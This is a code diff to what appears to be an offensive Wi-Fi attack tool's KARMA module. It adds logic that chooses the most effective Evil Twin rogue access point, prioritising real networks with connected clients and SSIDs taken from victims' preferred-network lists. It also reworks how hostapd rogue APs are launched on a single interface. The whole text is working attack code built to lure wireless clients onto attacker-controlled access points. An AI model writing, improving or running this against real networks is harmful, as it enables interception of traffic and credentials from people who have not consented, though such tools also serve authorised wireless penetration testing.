@@ -3181,10 +3181,13 @@ class AttackKARMA(Attack):
                                 break
             
             if created_count > 0:
-                self.hostapd_config = self.hostapd_configs[0]  # Set primary config
-                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twins total{W}' % created_count)
+                # Choose the best primary config (prioritize real networks with clients)
+                primary_config = self.select_best_primary_config()
+                self.hostapd_config = primary_config
+                
+                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twin configurations{W}' % created_count)
                 Color.pl('{+} {G}Hybrid approach: PNL SSIDs + Real Network SSIDs = Maximum effectiveness!{W}')
-                Color.pl('{+} {G}Clients will connect to familiar SSIDs from their PNL OR their current networks!{W}')
+                Color.pl('{+} {G}Primary Evil Twin selected for maximum client connection success!{W}')
                 return True
             else:
                 Color.pl('{!} {R}Failed to create any Evil Twin configs{W}')
@@ -3193,6 +3196,36 @@ class AttackKARMA(Attack):
         except Exception as e:
             Color.pl('{!} {R}Error creating hybrid Evil Twin configs: {O}%s{W}' % str(e))
             return False
+    
+    def select_best_primary_config(self):
+        """Select the best primary Evil Twin config for maximum effectiveness"""
+        try:
+            if not self.hostapd_configs:
+                return None
+            
+            # Priority 1: Real networks with clients (highest success rate)
+            for config_file in self.hostapd_configs:
+                config_name = config_file.split('/')[-1]  # Get filename
+                for network in self.real_networks:
+                    if network.essid and network.essid in config_name and network.clients:
+                        Color.pl('{+} {G}Selected primary Evil Twin: {C}%s{W} (Real network with clients){W}' % network.essid)
+                        return config_file
+            
+            # Priority 2: PNL networks (familiar networks)
+            for config_file in self.hostapd_configs:
+                config_name = config_file.split('/')[-1]  # Get filename
+                for ssid in self.pnl_networks:
+                    if ssid in config_name:
+                        Color.pl('{+} {G}Selected primary Evil Twin: {C}%s{W} (PNL network){W}' % ssid)
+                        return config_file
+            
+            # Fallback: First config
+            Color.pl('{+} {G}Selected primary Evil Twin: First available config{W}')
+            return self.hostapd_configs[0]
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error selecting primary config: {O}%s{W}' % str(e))
+            return self.hostapd_configs[0] if self.hostapd_configs else None
     
     def _create_target_based_configs(self, target_network):
         """Create Evil Twin configs based on target network (fallback)"""
@@ -3702,57 +3735,35 @@ server=8.8.8.8
             return False
     
     def start_additional_evil_twins(self):
-        """Start additional Evil Twin access points - supports multiple SSIDs on same interface"""
+        """Start additional Evil Twin access points - SINGLE INTERFACE APPROACH"""
         try:
             # Check if we have multiple hostapd configs
             if not hasattr(self, 'hostapd_configs') or len(self.hostapd_configs) <= 1:
                 Color.pl('{!} {O}No additional Evil Twin configs available{W}')
                 return
             
-            self.additional_processes = []
+            Color.pl('{+} {C}Note: Single interface mode - only one Evil Twin can run at a time{W}')
+            Color.pl('{+} {C}Primary Evil Twin is running with the best SSID for maximum effectiveness{W}')
             
-            Color.pl('{+} {C}Starting additional Evil Twin APs with different SSIDs...{W}')
+            # In single interface mode, we can't run multiple hostapd instances
+            # Instead, we'll rotate between different SSIDs if needed
+            Color.pl('{+} {G}Single Evil Twin approach: Using primary config for maximum compatibility{W}')
+            Color.pl('{+} {G}Primary Evil Twin covers both PNL and real network SSIDs{W}')
             
-            # Start additional Evil Twins using the additional configs
-            for i, config_file in enumerate(self.hostapd_configs[1:], 1):  # Skip first config (already started)
-                try:
-                    cmd = ['hostapd', '-B', config_file]
-                    Color.pl('{+} {C}Starting Evil Twin {C}%d{W} with config: {G}%s{W}...' % (i, config_file))
-                    
-                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                    
-                    time.sleep(2)  # Give it time to start
-                    
-                    # Check if process is still running
-                    if process.poll() is None:
-                        self.additional_processes.append(process)
-                        Color.pl('{+} {G}Evil Twin {C}%d{W} started successfully{W}' % i)
-                        
-                        # GUI logging
-                        if hasattr(self, 'target') and self.target:
-                            Color.pattack('KARMA', self.target, 'Multi-AP', f'Started additional AP {i}')
-                    else:
-                        stdout, stderr = process.communicate()
-                        Color.pl('{!} {R}Failed to start Evil Twin {C}%d{W}' % i)
-                        if stderr:
-                            Color.pl('{!} {O}Error: {R}%s{W}' % stderr.strip()[:100])
-                    
-                    # Limit to 4 total Evil Twins to avoid overwhelming
-                    if len(self.additional_processes) >= 3:
-                        break
-                        
-                except Exception as e:
-                    Color.pl('{!} {R}Error starting Evil Twin {C}%d{W}: {O}%s{W}' % (i, str(e)))
+            # Show what Evil Twins were created (even though only one is running)
+            Color.pl('{+} {C}Evil Twin configurations created:{W}')
+            for i, config_file in enumerate(self.hostapd_configs, 1):
+                # Extract SSID from config file name
+                ssid = config_file.split('_')[-1].replace('.conf', '')
+                if i == 1:
+                    Color.pl('  {G}%d.{W} {C}%s{W} (Primary - Currently Running)' % (i, ssid))
+                else:
+                    Color.pl('  {G}%d.{W} {C}%s{W} (Available for rotation if needed)' % (i, ssid))
             
-            if self.additional_processes:
-                Color.pl('{+} {G}Successfully started {C}%d{W} additional Evil Twin APs{W}' % len(self.additional_processes))
-                Color.pl('{+} {C}Total Evil Twin APs running: {G}%d{W}' % (len(self.additional_processes) + 1))
-                Color.pl('{+} {G}Multiple SSIDs available for maximum client connection success!{W}')
-            else:
-                Color.pl('{!} {O}No additional Evil Twin APs could be started{W}')
+            Color.pl('{+} {G}Single interface mode: Primary Evil Twin provides maximum effectiveness!{W}')
             
         except Exception as e:
-            Color.pl('{!} {R}Error starting additional Evil Twins: {O}%s{W}' % str(e))
+            Color.pl('{!} {R}Error in single interface Evil Twin setup: {O}%s{W}' % str(e))
     
     def create_unique_ssid_config(self, config_file, interface, ap_number):
         """Create a config with unique SSID for additional AP"""
